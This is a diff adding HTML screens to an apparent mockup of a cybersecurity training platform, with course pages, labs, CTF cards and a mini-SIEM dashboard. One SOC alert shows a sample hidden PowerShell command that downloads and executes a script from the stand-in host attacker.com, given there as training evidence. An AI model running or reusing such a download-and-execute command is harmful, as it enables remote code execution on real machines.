+                    <h4 style="font-size:13px;">Linux Operations</h4>
+                    <span style="font-size:11px; color: var(--success-text);">Completed</span>
+                  </div>
+                </div>
+                <div class="journey-node active" onclick="showScreenDirect('course-detail')">
+                  <div class="journey-node-icon"><i class="fa-solid fa-network-wired"></i></div>
+                  <div>
+                    <h4 style="font-size:13px;">Traffic Analysis</h4>
+                    <span style="font-size:11px; color: var(--info-text);">In Progress</span>
+                  </div>
+                </div>
+                <div class="journey-node" onclick="showScreenDirect('course-detail')">
+                  <div class="journey-node-icon"><i class="fa-solid fa-server"></i></div>
+                  <div>
+                    <h4 style="font-size:13px;">Systems Security</h4>
+                    <span style="font-size:11px; color: var(--gray-500);">Locked</span>
+                  </div>
+                </div>
+              </div>
+            </div>
+
+            <!-- Level 2 Node -->
+            <div class="journey-level">
+              <div class="level-meta">
+                <div>
+                  <span class="level-badge gold">Level 2</span>
+                  <h3 style="display: inline-block; margin-left: 8px;">Cybersecurity Operations (SOC)</h3>
+                </div>
+                <span style="font-size: 13px; color: var(--gray-500); font-weight: 500;"><i class="fa-solid fa-clock"></i> 6 Weeks | 60 Hours</span>
+              </div>
+              <div class="journey-nodes">
+                <div class="journey-node" onclick="showScreenDirect('soc-lab')">
+                  <div class="journey-node-icon"><i class="fa-solid fa-eye"></i></div>
+                  <div>
+                    <h4 style="font-size:13px;">SIEM Monitoring</h4>
+                    <span style="font-size:11px; color: var(--gray-500);">Locked</span>
+                  </div>
+                </div>
+                <div class="journey-node" onclick="showScreenDirect('soc-lab')">
+                  <div class="journey-node-icon"><i class="fa-solid fa-bug"></i></div>
+                  <div>
+                    <h4 style="font-size:13px;">Vulnerability Audit</h4>
+                    <span style="font-size:11px; color: var(--gray-500);">Locked</span>
+                  </div>
+                </div>
+                <div class="journey-node" onclick="showScreenDirect('soc-lab')">
+                  <div class="journey-node-icon"><i class="fa-solid fa-magnifying-glass-chart"></i></div>
+                  <div>
+                    <h4 style="font-size:13px;">Incident Response</h4>
+                    <span style="font-size:11px; color: var(--gray-500);">Locked</span>
+                  </div>
+                </div>
+                <div class="journey-node" onclick="showScreenDirect('capstone')">
+                  <div class="journey-node-icon"><i class="fa-solid fa-diagram-project"></i></div>
+                  <div>
+                    <h4 style="font-size:13px;">Capstone Project</h4>
+                    <span style="font-size:11px; color: var(--gray-500);">Locked</span>
+                  </div>
+                </div>
+              </div>
+            </div>
+            
+            <!-- Level 3 Node -->
+            <div class="journey-level">
+              <div class="level-meta">
+                <div>
+                  <span class="level-badge" style="background-color: var(--gray-700);">Level 3</span>
+                  <h3 style="display: inline-block; margin-left: 8px;">Professional Security Engineering</h3>
+                </div>
+                <span style="font-size: 13px; color: var(--gray-500); font-weight: 500;"><i class="fa-solid fa-clock"></i> 8 Weeks | 80 Hours</span>
+              </div>
+              <div class="journey-nodes">
+                <div class="journey-node">
+                  <div class="journey-node-icon"><i class="fa-solid fa-spider"></i></div>
+                  <div>
+                    <h4 style="font-size:13px;">Threat Hunting</h4>
+                    <span style="font-size:11px; color: var(--gray-500);">Locked</span>
+                  </div>
+                </div>
+                <div class="journey-node">
+                  <div class="journey-node-icon"><i class="fa-solid fa-microscope"></i></div>
+                  <div>
+                    <h4 style="font-size:13px;">Malware Analysis</h4>
+                    <span style="font-size:11px; color: var(--gray-500);">Locked</span>
+                  </div>
+                </div>
+                <div class="journey-node">
+                  <div class="journey-node-icon"><i class="fa-solid fa-user-shield"></i></div>
+                  <div>
+                    <h4 style="font-size:13px;">GRC & Compliance</h4>
+                    <span style="font-size:11px; color: var(--gray-500);">Locked</span>
+                  </div>
+                </div>
+              </div>
+            </div>
+          </div>
+        </div>
+
+        <!-- Screen 8: Course Detail -->
+        <div id="view-course-detail" class="screen">
+          <div class="screen-header">
+            <div>
+              <span class="badge badge-blue">Level 1 Basic</span>
+              <h1 style="margin-top: 4px;">TCP/IP & Traffic Analysis</h1>
+              <p class="screen-description">Learn network anatomy, protocol handshakes, and command-line traffic inspection tools.</p>
+            </div>
+            <button class="btn btn-primary" onclick="showScreenDirect('lesson-player')">Start Learning <i class="fa-solid fa-play"></i></button>
+          </div>
+          
+          <div class="grid-3-1">
+            <div>
+              <!-- Course Syllabus Matrix -->
+              <div class="card" style="margin-bottom: 24px;">
+                <h3 class="card-title">Weekly Course Outline</h3>
+                
+                <div style="display: flex; flex-direction: column; gap: 16px;">
+                  <div style="border-bottom: 1px solid var(--gray-200); padding-bottom: 16px;">
+                    <div style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 8px;">
+                      <h4 style="color: var(--navy-deep);">Week 1: Networking Basics & Protocol Stacks</h4>
+                      <span class="badge badge-green">Completed</span>
+                    </div>
+                    <p style="font-size: 13px; color: var(--gray-500);">Introduction to ISO/OSI model and physical cabling standards.</p>
+                  </div>
+                  
+                  <div style="border-bottom: 1px solid var(--gray-200); padding-bottom: 16px;">
+                    <div style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 8px;">
+                      <h4 style="color: var(--navy-deep);">Week 2: Subnetting, Routing, & Switches</h4>
+                      <span class="badge badge-green">Completed</span>
+                    </div>
+                    <p style="font-size: 13px; color: var(--gray-500);">Understand CIDR notation and router forwarding behaviors.</p>
+                  </div>
+
+                  <div style="border-bottom: 1px solid var(--gray-200); padding-bottom: 16px;">
+                    <div style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 8px;">
+                      <h4 style="color: var(--navy-deep);">Week 3: TCP/IP Mechanics & Three-Way Handshake</h4>
+                      <span class="badge badge-blue">Active</span>
+                    </div>
+                    <p style="font-size: 13px; color: var(--gray-500);">Analyze connection setups, teardowns, and sequence numbers.</p>
+                    
+                    <div style="display: flex; gap: 12px; margin-top: 12px; font-size: 12px; color: var(--gray-600);">
+                      <span><i class="fa-solid fa-video"></i> 1 Video</span>
+                      <span><i class="fa-solid fa-flask"></i> 1 Cyber Lab</span>
+                      <span><i class="fa-solid fa-flag"></i> 1 Challenge</span>
+                    </div>
+                  </div>
+
+                  <div>
+                    <div style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 8px;">
+                      <h4 style="color: var(--gray-400);">Week 4: DNS, DHCP & Basic Services Inspection</h4>
+                      <span class="badge badge-warning" style="background-color: var(--gray-200); color: var(--gray-600);">Locked</span>
+                    </div>
+                    <p style="font-size: 13px; color: var(--gray-400);">Learn to capture domain requests and lease assignments.</p>
+                  </div>
+                </div>
+              </div>
+            </div>
+            
+            <div>
+              <!-- Instructor Panel -->
+              <div class="card" style="margin-bottom: 24px;">
+                <h3 class="card-title">Your Instructor</h3>
+                <div style="text-align: center; padding: 12px 0;">
+                  <img src="https://images.unsplash.com/photo-1573496359142-b8d87734a5a2?q=80&w=256&auto=format&fit=crop" alt="Instructor" style="width: 80px; height: 80px; border-radius: 50%; object-fit: cover; margin-bottom: 12px;">
+                  <h4 style="color: var(--navy-deep);">Erika Pratiwi, CISSP</h4>
+                  <span style="font-size: 12px; color: var(--gray-500); display: block; margin-bottom: 16px;">Lead Blue Team Mentor</span>
+                  <button class="btn btn-secondary btn-sm" style="width: 100%;" onclick="openMentorChat()">Ask a Question</button>
+                </div>
+              </div>
+            </div>
+          </div>
+        </div>
+
+        <!-- Screen 9, 10 & 11: Lesson Player (Video Learning & Interactive Text Combined) -->
+        <div id="view-lesson-player" class="screen" style="padding: 0;">
+          <div class="lesson-player-layout">
+            <div class="lesson-sidebar">
+              <div class="lesson-sidebar-header">
+                <h3 style="font-size: 16px;">Course Content</h3>
+                <span style="font-size: 11px; color: var(--gray-500);">TCP/IP & Traffic Analysis</span>
+              </div>
+              <ul class="lesson-list">
+                <li class="lesson-item">
+                  <div class="lesson-link completed" onclick="loadLesson('intro')">
+                    <span><i class="fa-solid fa-circle-check status-icon" style="margin-right: 8px;"></i> 1. Introduction Video</span>
+                    <span style="font-size: 11px; color: var(--gray-400);">4m</span>
+                  </div>
+                </li>
+                <li class="lesson-item">
+                  <div class="lesson-link active" onclick="loadLesson('handshake')">
+                    <span><i class="fa-solid fa-video status-icon" style="margin-right: 8px;"></i> 2. TCP Handshake Theory</span>
+                    <span style="font-size: 11px; color: var(--gray-400);">12m</span>
+                  </div>
+                </li>
+                <li class="lesson-item">
+                  <div class="lesson-link" onclick="loadLesson('reading')">
+                    <span><i class="fa-solid fa-file-invoice status-icon" style="margin-right: 8px;"></i> 3. Network Header Anatomy</span>
+                    <span style="font-size: 11px; color: var(--gray-400);">Reading</span>
+                  </div>
+                </li>
+                <li class="lesson-item">
+                  <div class="lesson-link" onclick="showScreenDirect('cyber-lab')">
+                    <span><i class="fa-solid fa-flask status-icon" style="margin-right: 8px;"></i> 4. Lab: Capture Traffic</span>
+                    <span style="font-size: 11px; color: var(--gold);"><i class="fa-solid fa-play"></i> Launch</span>
+                  </div>
+                </li>
+              </ul>
+            </div>
+            
+            <div class="lesson-content-area" id="lesson-main-content">
+              <!-- Default Content: Video Player (Screen 10) -->
+              <div id="lesson-video-player">
+                <h2 id="lesson-title" style="margin-bottom: 12px;">2. TCP Handshake Theory & Flag Mechanics</h2>
+                
+                <div class="video-placeholder">
+                  <div class="video-overlay-info">
+                    <h3>TCP Connection Management</h3>
+                    <p>Instructor: Erika Pratiwi (09:42 / 12:15)</p>
+                  </div>
+                  <button class="video-play-btn"><i class="fa-solid fa-play"></i></button>
+                </div>
+                
+                <div class="tab-container">
+                  <div class="tab-nav">
+                    <button class="tab-link active" onclick="toggleLessonTab('notes')">Lecture Notes</button>
+                    <button class="tab-link" onclick="toggleLessonTab('resources')">Resources</button>
+                  </div>
+                  
+                  <div class="tab-content active" id="lesson-tab-notes">
+                    <p style="margin-bottom: 16px;">
+                      The Transmission Control Protocol (TCP) uses a three-way handshake to establish a reliable connection.
+                      This process ensures both client and server are synchronized and ready to exchange IP packets.
+                    </p>
+                    <div style="background-color: var(--gray-100); padding: 16px; border-radius: var(--radius-md); font-family: var(--font-mono); font-size: 13px;">
+                      Step 1: Client sends SYN (Synchronize sequence number)<br>
+                      Step 2: Server responds with SYN-ACK (Acknowledge and Syn sequence number)<br>
+                      Step 3: Client responds with ACK (Acknowledge sequence)
+                    </div>
+                  </div>
+                  
+                  <div class="tab-content" id="lesson-tab-resources">
+                    <ul>
+                      <li><a href="#" style="color:var(--navy-light); font-weight:600;"><i class="fa-solid fa-file-pdf"></i> TCP Flags Handout Reference Sheet (PDF)</a></li>
+                      <li><a href="#" style="color:var(--navy-light); font-weight:600;"><i class="fa-solid fa-link"></i> Wireshark Official Sample Capture Library</a></li>
+                    </ul>
+                  </div>
+                </div>
+              </div>
+            </div>
+          </div>
+        </div>
+
+        <!-- Screen 12: Cyber Lab Hub -->
+        <div id="view-cyber-lab" class="screen">
+          <div class="screen-header">
+            <div>
+              <h1>Cyber Lab Exercises</h1>
+              <p class="screen-description">Access sandbox labs containing live virtual machines, traffic traces, and forensics environments.</p>
+            </div>
+            <div style="display:flex; gap:16px;">
+              <div class="card" style="padding:10px 20px; display:flex; align-items:center; gap:12px;">
+                <span style="font-size:11px; text-transform:uppercase; color:var(--gray-500);">Completed Labs</span>
+                <strong>6 / 8</strong>
+              </div>
+              <div class="card" style="padding:10px 20px; display:flex; align-items:center; gap:12px;">
+                <span style="font-size:11px; text-transform:uppercase; color:var(--gray-500);">Practice Time</span>
+                <strong>14.5 Hours</strong>
+              </div>
+            </div>
+          </div>
+
+          <div class="grid-3" id="lab-list-grid">
+            <!-- Lab Item 1 -->
+            <div class="card">
+              <div style="display:flex; justify-content:space-between; margin-bottom:12px;">
+                <span class="badge badge-blue">Networking</span>
+                <span style="font-size:12px; color:var(--gray-500);"><i class="fa-solid fa-clock"></i> 90m</span>
+              </div>
+              <h3 style="font-size: 16px; margin-bottom: 8px;">Wireshark Packet Analysis</h3>
+              <p style="font-size: 13px; color: var(--gray-600); margin-bottom: 16px;">
+                Inspect traffic dumps and isolate credentials from cleartext protocol exchanges.
+              </p>
+              <div style="border-top:1px solid var(--gray-100); padding-top:12px; display:flex; justify-content:space-between; align-items:center;">
+                <span style="font-size:11px; font-weight:700; color:var(--gray-500);">Difficulty: Intermediate</span>
+                <button class="btn btn-primary btn-sm" onclick="launchLabSimulation('Wireshark Packet Analysis')">Launch Lab</button>
+              </div>
+            </div>
+
+            <!-- Lab Item 2 -->
+            <div class="card">
+              <div style="display:flex; justify-content:space-between; margin-bottom:12px;">
+                <span class="badge badge-green">Linux Ops</span>
+                <span style="font-size:12px; color:var(--gray-500);"><i class="fa-solid fa-clock"></i> 45m</span>
+              </div>
+              <h3 style="font-size: 16px; margin-bottom: 8px;">Linux PrivEsc Basics</h3>
+              <p style="font-size: 13px; color: var(--gray-600); margin-bottom: 16px;">
+                Exploit misconfigured SUID binaries to elevate permissions to root user.
+              </p>
+              <div style="border-top:1px solid var(--gray-100); padding-top:12px; display:flex; justify-content:space-between; align-items:center;">
+                <span style="font-size:11px; font-weight:700; color:var(--gray-500);">Difficulty: Easy</span>
+                <span class="badge badge-green" style="font-size:10px;"><i class="fa-solid fa-circle-check"></i> Competent</span>
+              </div>
+            </div>
+
+            <!-- Lab Item 3 (SOC lab, Screen 14) -->
+            <div class="card card-premium">
+              <div style="display:flex; justify-content:space-between; margin-bottom:12px;">
+                <span class="badge badge-gold">SOC Lab</span>
+                <span style="font-size:12px; color:var(--gray-500);"><i class="fa-solid fa-clock"></i> 120m</span>
+              </div>
+              <h3 style="font-size: 16px; margin-bottom: 8px;">Suspicious PowerShell Execution</h3>
+              <p style="font-size: 13px; color: var(--gray-600); margin-bottom: 16px;">
+                Investigate alerts on our simulated SIEM dashboard and run correlation scripts.
+              </p>
+              <div style="border-top:1px solid var(--gray-100); padding-top:12px; display:flex; justify-content:space-between; align-items:center;">
+                <span style="font-size:11px; font-weight:700; color:var(--gold-hover);">Difficulty: High</span>
+                <button class="btn btn-gold btn-sm" onclick="showScreenDirect('soc-lab')">Enter SOC Lab</button>
+              </div>
+            </div>
+          </div>
+        </div>
+
+        <!-- Screen 13: Virtual Cyber Range (Lab Environment Simulation) -->
+        <div id="view-cyber-range" class="screen" style="padding:0;">
+          <div class="cyber-range-wrapper">
+            <!-- Left instructions panel -->
+            <div class="range-instructions">
+              <h3 style="margin-bottom: 12px; border-bottom:1px solid var(--gray-100); padding-bottom:8px;">Lab: Wireshark Packet Analysis</h3>
+              <span class="badge badge-blue" style="margin-bottom: 16px;">Objective</span>
+              <p style="font-size: 13px; color: var(--gray-700); margin-bottom: 16px;">
+                A machine inside our DMZ has been compromised. The attacker transferred a secret file over an unencrypted channel. Your goal is to:
+              </p>
+              <ul style="font-size: 13px; color: var(--gray-700); margin-left: 20px; margin-bottom: 24px;">
+                <li>Scan the subnet to identify active network interfaces.</li>
+                <li>Analyze the active Wireshark dump `capture.pcap`.</li>
+                <li>Find the cleartext password leaked during authentication.</li>
+              </ul>
+              
+              <!-- Evidence Submission -->
+              <div style="background-color:var(--gray-50); border:1px solid var(--gray-200); border-radius:var(--radius-md); padding:16px;">
+                <h4 style="font-size:13px; margin-bottom:8px;">Submit Lab Flag</h4>
+                <div class="form-group" style="margin-bottom:12px;">
+                  <input type="text" id="range-flag-input" class="form-control" placeholder="FLAG{xxxx_xxxx_xxxx}">
+                </div>
+                <button class="btn btn-primary btn-sm" style="width: 100%;" onclick="submitRangeFlag()">Submit Flag</button>
+              </div>
+            </div>
+            
+            <!-- Right Virtual Console area -->
+            <div class="range-console-container">
+              <div class="range-screen-sim">
+                <div class="range-bar">
+                  <div class="range-status-item">
+                    <span class="range-status-indicator"></span>
+                    <strong>Environment Active: Sandbox-Kali01</strong>
+                  </div>
+                  <div class="range-tabs">
+                    <button class="range-tab-btn active">Terminal Console</button>
+                    <button class="range-tab-btn" onclick="alert('RDP GUI Desktop connecting... (Simulation Only)')">Kali Desktop</button>
+                  </div>
+                </div>
+                
+                <div class="range-desktop-view">
+                  <div class="terminal-area" id="range-terminal-output">
+                    <div class="terminal-line">[SYSTEM] Sandbox initialized successfully.</div>
+                    <div class="terminal-line">[SYSTEM] Target VM address: 10.0.12.82 (Online)</div>
+                    <div class="terminal-line">[SYSTEM] Capture file loaded at /home/kali/capture.pcap</div>
+                    <div class="terminal-line"><span class="terminal-prompt">kali@technotama:~$</span> ls -la</div>
+                    <div class="terminal-line">total 2048<br>drwxr-xr-x  2 kali kali    4096 Jul 28 14:00 .<br>-rw-r--r--  1 kali kali 2097152 Jul 28 14:00 capture.pcap</div>
+                    <div class="terminal-line" id="terminal-cursor-line"><span class="terminal-prompt">kali@technotama:~$</span> <span id="terminal-input-display"></span><span style="animation: blink 1s infinite;">|</span></div>
+                  </div>
+                  
+                  <div class="terminal-input-wrap" style="background-color: var(--gray-900); padding: 8px 12px; border-radius: var(--radius-sm);">
+                    <span class="terminal-prompt">CMD:</span>
+                    <input type="text" id="terminal-cli-input" placeholder="Type command here (e.g. tshark -r capture.pcap, nmap -sV 10.0.12.82)..." onkeydown="handleTerminalCommand(event)">
+                  </div>
+                </div>
+                
+                <div class="range-status-bar">
+                  <span>Session Expires: <strong style="color:var(--warning);" id="range-session-timer">59:54</strong></span>
+                  <span>Target: VM-01 (10.0.12.82)</span>
+                  <div style="display:flex; gap:8px;">
+                    <button onclick="resetLabSimulation()" style="color:var(--gray-400); font-weight:600; font-size:11px;"><i class="fa-solid fa-rotate-left"></i> Reset VM</button>
+                  </div>
+                </div>
+              </div>
+            </div>
+          </div>
+        </div>
+
+        <!-- Screen 14: SOC Lab (Mini SIEM Alert Queue Dashboard) -->
+        <div id="view-soc-lab" class="screen">
+          <div class="screen-header">
+            <div>
+              <span class="badge badge-gold">Level 2 Intermediate</span>
+              <h1 style="margin-top:4px;">Technotama Mini-SIEM Dashboard</h1>
+              <p class="screen-description">Investigate real security signals, compile timeline forensics, and review logs.</p>
+            </div>
+          </div>
+          
+          <div class="soc-layout">
+            <div>
+              <h3 style="margin-bottom:12px;">Alert Queue</h3>
+              
+              <div class="soc-alert-item selected" onclick="selectSocAlert('alert-1', this)">
+                <div class="soc-alert-header">
+                  <span class="severity-pill severity-critical">Critical</span>
+                  <span>Timestamp: 14:02:11</span>
+                </div>
+                <div class="soc-alert-title">Suspicious PowerShell Download Script</div>
+                <div class="soc-alert-meta">
+                  <span>Source Host: WIN-DEVT01</span>
+                  <span>ID: 8021</span>
+                </div>
+              </div>
+
+              <div class="soc-alert-item" onclick="selectSocAlert('alert-2', this)">
+                <div class="soc-alert-header">
+                  <span class="severity-pill severity-high">High</span>
+                  <span>Timestamp: 13:58:45</span>
+                </div>
+                <div class="soc-alert-title">Multiple Failed Login Attempts (Brute Force)</div>
+                <div class="soc-alert-meta">
+                  <span>Source Host: EXCH-PROD02</span>
+                  <span>ID: 7091</span>
+                </div>
+              </div>
+
+              <div class="soc-alert-item" onclick="selectSocAlert('alert-3', this)">
+                <div class="soc-alert-header">
+                  <span class="severity-pill severity-medium">Medium</span>
+                  <span>Timestamp: 13:45:00</span>
+                </div>
+                <div class="soc-alert-title">Unusual DNS Outbound Tunneling Query</div>
+                <div class="soc-alert-meta">
+                  <span>Source Host: KALI-USER05</span>
+                  <span>ID: 4092</span>
+                </div>
+              </div>
+            </div>
+            
+            <div class="soc-investigation-pane" id="soc-investigation-details">
+              <h3 style="border-bottom:1px solid var(--gray-200); padding-bottom:12px; margin-bottom:16px;">Alert Details</h3>
+              <div style="margin-bottom:16px;">
+                <label class="form-label" style="font-weight:700;">Event Name</label>
+                <div style="font-size:15px; font-weight:600; color:var(--navy-deep);">Suspicious PowerShell Download Script</div>
+              </div>
+              
+              <div class="grid-2" style="margin-bottom:16px;">
+                <div>
+                  <label class="form-label">Mitre Tactic</label>
+                  <span class="badge badge-blue">TA0002 Execution</span>
+                </div>
+                <div>
+                  <label class="form-label">Trigger Tool</label>
+                  <code style="font-family:var(--font-mono); font-size:12px; background:var(--gray-100); padding:2px 6px; border-radius:4px;">PowerShell.exe</code>
+                </div>
+              </div>
+
+              <div style="margin-bottom:20px;">
+                <label class="form-label">Payload Command String</label>
+                <textarea class="form-control" style="font-family:var(--font-mono); font-size:12px; height:80px; background:var(--gray-900); color:#9ece6a;" readonly>
+powershell.exe -NoP -NonI -W Hidden -Exec Bypass -Command "IEX(New-Object Net.WebClient).DownloadString('http://attacker.com/payload.ps1')"
+                </textarea>
+              </div>
+
+              <h4 style="margin-bottom:12px;">Investigation Timeline</h4>
+              <div class="timeline-flow" style="margin-bottom:24px;">
+                <div class="timeline-node success">
+                  <div style="font-size:12px; font-weight:700;">System Event Log (Win Event 4688)</div>
+                  <div style="font-size:11px; color:var(--gray-500);">Process Creation triggered by Service Account.</div>
+                </div>
+                <div class="timeline-node success">
+                  <div style="font-size:12px; font-weight:700;">Network Security Monitor alert</div>
+                  <div style="font-size:11px; color:var(--gray-500);">HTTP request made to attacker.com domain.</div>
+                </div>
+              </div>
+
+              <button class="btn btn-primary" style="width:100%;" onclick="escalateIncident()">Escalate Incident to Tier-2</button>
+            </div>
+          </div>
+        </div>
+
+        <!-- Screen 15: CTF Challenge Center -->
+        <div id="view-ctf-challenges" class="screen">
+          <div class="screen-header">
+            <div>
+              <h1>CTF Capture The Flag</h1>
+              <p class="screen-description">Solve tactical challenges, submit flags, and earn points on our live leaderboard.</p>
+            </div>
+            <div style="display:flex; gap:16px; align-items:center;">
+              <span style="font-size:14px; font-weight:600;"><i class="fa-solid fa-bolt" style="color:var(--gold);"></i> Streak: <strong>5 Days</strong></span>
+              <div class="card" style="padding:10px 20px; font-weight:700; color:var(--gold-hover);">1,250 XP</div>
+            </div>
+          </div>
+
+          <div class="grid-3">
+            <!-- CTF Card 1 -->
+            <div class="ctf-card">
+              <div>
+                <div class="ctf-header">
+                  <span class="badge badge-blue">OSINT</span>
+                  <span class="ctf-points">100 pts</span>
+                </div>
+                <h3 class="ctf-title">The Forgotten Metadata</h3>
+                <p style="font-size: 12px; color:var(--gray-600);">An executive leaked a PDF report. Extract the hidden geolocation coordinates from the metadata.</p>
+              </div>
+              <div class="ctf-footer">
+                <span style="font-size:11px; color:var(--gray-500);">Solves: 182 Users</span>
+                <button class="btn btn-primary btn-sm" onclick="launchCtfSimulator('The Forgotten Metadata')">Solve Challenge</button>
+              </div>
+            </div>
+
+            <!-- CTF Card 2 -->
+            <div class="ctf-card">
+              <div>
+                <div class="ctf-header">
+                  <span class="badge badge-red">Web Sec</span>
+                  <span class="ctf-points">250 pts</span>
+                </div>
+                <h3 class="ctf-title">SQLi Auth Bypass</h3>
+                <p style="font-size: 12px; color:var(--gray-600);">Authenticate as administrator on the target site by manipulating SQL parameters on the login payload.</p>
+              </div>
+              <div class="ctf-footer">
+                <span style="font-size:11px; color:var(--gray-500);">Solves: 89 Users</span>
+                <button class="btn btn-primary btn-sm" onclick="launchCtfSimulator('SQLi Auth Bypass')">Solve Challenge</button>
+              </div>
+            </div>
+
+            <!-- CTF Card 3 -->
+            <div class="ctf-card completed">
+              <div>
+                <div class="ctf-header">
+                  <span class="badge badge-green">Forensics</span>
+                  <span class="ctf-points" style="color:var(--success);">Completed</span>
+                </div>
+                <h3 class="ctf-title">Steganography Hideout</h3>
+                <p style="font-size: 12px; color:var(--gray-600);">A suspect hid coordinates inside a profile picture. Discover the password and extract the flag.</p>
+              </div>
+              <div class="ctf-footer">
+                <span style="font-size:11px; color:var(--gray-500);">Completed!</span>
+                <span class="badge badge-green" style="font-size:10px;"><i class="fa-solid fa-circle-check"></i> Unlocked</span>
+              </div>
+            </div>
+          </div>
+        </div>
+
+        <!-- Screen 16: Assessment Center -->
+        <div id="view-assessments" class="screen">
+          <div class="screen-header">
+            <div>
+              <h1>Assessment Dashboard</h1>
+              <p class="screen-description">Check required quizzes, case study papers, and practical lab checkpoints.</p>
+            </div>
+          </div>
+
+          <div class="card" style="margin-bottom: 24px;">
+            <h3 class="card-title">Assigned Tasks</h3>
+            
+            <table style="width: 100%; border-collapse: collapse; text-align: left; font-size: 14px;">
+              <thead>
+                <tr style="border-bottom: 2px solid var(--gray-200); color: var(--gray-600); font-weight: 700;">
+                  <th style="padding: 12px 8px;">Assessment Type</th>
+                  <th style="padding: 12px 8px;">Task Name</th>
+                  <th style="padding: 12px 8px;">Due Date</th>
+                  <th style="padding: 12px 8px;">Grade Status</th>
+                  <th style="padding: 12px 8px;">Action</th>
+                </tr>
+              </thead>
+              <tbody>
+                <tr style="border-bottom: 1px solid var(--gray-100);">
+                  <td style="padding: 12px 8px;"><span class="badge badge-blue">Quiz</span></td>
+                  <td style="padding: 12px 8px; font-weight: 600;">IP Addressing & Subnetting Test</td>
+                  <td style="padding: 12px 8px;">Jul 30, 2026</td>
+                  <td style="padding: 12px 8px;"><span class="badge badge-warning">Not Started</span></td>
+                  <td style="padding: 12px 8px;"><button class="btn btn-primary btn-sm" onclick="alert('Quiz launch simulator')">Start Quiz</button></td>
+                </tr>
+                <tr style="border-bottom: 1px solid var(--gray-100);">
+                  <td style="padding: 12px 8px;"><span class="badge badge-gold">Case Study</span></td>
+                  <td style="padding: 12px 8px; font-weight: 600;">Threat Landscape Assessment Report</td>
+                  <td style="padding: 12px 8px;">Aug 05, 2026</td>
+                  <td style="padding: 12px 8px;"><span class="badge badge-blue">Submitted</span></td>
+                  <td style="padding: 12px 8px;"><button class="btn btn-secondary btn-sm" disabled>Under Review</button></td>
+                </tr>
+                <tr style="border-bottom: 1px solid var(--gray-100);">
+                  <td style="padding: 12px 8px;"><span class="badge badge-green">Practical Lab</span></td>
+                  <td style="padding: 12px 8px; font-weight: 600;">Linux Command Line Checkpoint</td>
+                  <td style="padding: 12px 8px;">Completed</td>
+                  <td style="padding: 12px 8px;"><span class="badge badge-green">Passed (92/100)</span></td>
+                  <td style="padding: 12px 8px;"><a href="#" onclick="showScreenDirect('profile')" style="color:var(--navy-light); font-weight:600;">View Review</a></td>
+                </tr>
+              </tbody>
+            </table>
+          </div>
+        </div>
+
+        <!-- Screen 17: Competency Dashboard -->
+        <div id="view-competency" class="screen">
+          <div class="screen-header">
+            <div>
+              <h1>Competency Matrix</h1>
+              <p class="screen-description">Explore your verified skillset levels calculated from completed labs, quizzes, and projects.</p>
+            </div>
+          </div>
+          
+          <div class="grid-3-1">
+            <div>
+              <div class="card" style="margin-bottom: 24px;">
+                <h3 class="card-title">Competency Ratings</h3>
+                
+                <div style="display: flex; flex-direction: column; gap: 20px;">
+                  <!-- Competency Bar 1 -->
+                  <div class="progress-container">
+                    <div style="display:flex; justify-content:space-between; font-size:14px; font-weight:600; margin-bottom:6px;">
+                      <span>Networking & Packet Inspection</span>
+                      <span style="color: var(--success);">KOMPETEN (80%)</span>
+                    </div>
+                    <div class="progress-bar-bg">
+                      <div class="progress-bar-fill success" style="width: 80%;"></div>
+                    </div>
+                  </div>
+                  
+                  <!-- Competency Bar 2 -->
+                  <div class="progress-container">
+                    <div style="display:flex; justify-content:space-between; font-size:14px; font-weight:600; margin-bottom:6px;">
+                      <span>Linux Operations & Administration</span>
+                      <span style="color: var(--success);">MAHIR (90%)</span>
+                    </div>
+                    <div class="progress-bar-bg">
+                      <div class="progress-bar-fill success" style="width: 90%;"></div>
+                    </div>
+                  </div>
+
+                  <!-- Competency Bar 3 -->
+                  <div class="progress-container">
+                    <div style="display:flex; justify-content:space-between; font-size:14px; font-weight:600; margin-bottom:6px;">
+                      <span>Threat Identification & Analysis</span>
+                      <span style="color: var(--success);">KOMPETEN (72%)</span>
+                    </div>
+                    <div class="progress-bar-bg">
+                      <div class="progress-bar-fill success" style="width: 72%;"></div>
+                    </div>
+                  </div>
+
+                  <!-- Competency Bar 4 -->
+                  <div class="progress-container">
+                    <div style="display:flex; justify-content:space-between; font-size:14px; font-weight:600; margin-bottom:6px;">
+                      <span>Security Scripting (Python / Bash)</span>
+                      <span style="color: var(--warning);">CUKUP (54%)</span>
+                    </div>
+                    <div class="progress-bar-bg">
+                      <div class="progress-bar-fill warning" style="width: 54%;"></div>
+                    </div>
+                  </div>
+                </div>
+              </div>
+            </div>
+            
+            <div>
+              <div class="card">
+                <h3 class="card-title">Recommendations</h3>
+                <p style="font-size: 13px; color: var(--gray-600); margin-bottom: 16px;">
+                  Your security scripting competency is currently flagged as <strong>CUKUP</strong>. Complete these suggestions to level up:
+                </p>
+                <div style="display:flex; flex-direction:column; gap:12px;">
+                  <div style="border-left:3px solid var(--warning); padding-left:12px; font-size:12px;">
+                    <strong>Lab: Scripting for Port Scanners</strong>
+                    <div style="color:var(--gray-500);">Improves Python capability (+12 XP)</div>
+                  </div>
+                  <div style="border-left:3px solid var(--warning); padding-left:12px; font-size:12px;">
+                    <strong>Re-read: Automating Bash Triggers</strong>
+                    <div style="color:var(--gray-500);">Module 2 resources</div>
+                  </div>
+                </div>
+              </div>
+            </div>
+          </div>
+        </div>
+
+        <!-- Screen 18: Capstone Project -->
+        <div id="view-capstone" class="screen">
+          <div class="screen-header">
+            <div>
+              <h1>Capstone Project Workspace</h1>
+              <p class="screen-description">Coordinate deliverables and submit source links for your final graduation project.</p>
+            </div>
+          </div>
+
+          <div class="grid-3-1">
+            <div>
+              <div class="card" style="margin-bottom: 24px;">
+                <h3 class="card-title">Project: Build an Automated SIEM Parser</h3>
+                <p style="font-size: 13px; color:var(--gray-600); margin-bottom: 20px;">
+                  Develop a python tool to parse Nginx error logs, match anomalies to known malicious threat addresses, and execute notification hooks.
+                </p>
+                
+                <h4 style="margin-bottom:12px;">Development Progress</h4>
+                <div style="display:flex; justify-content:space-between; margin-bottom:20px;">
+                  <span style="font-size:12px; font-weight:700;">Brief &rarr; Planning &rarr; <span style="color:var(--info);">Build</span> &rarr; Test &rarr; Submit &rarr; Review</span>
+                </div>
+
+                <div class="form-group">
+                  <label class="form-label">Repository URL Link</label>
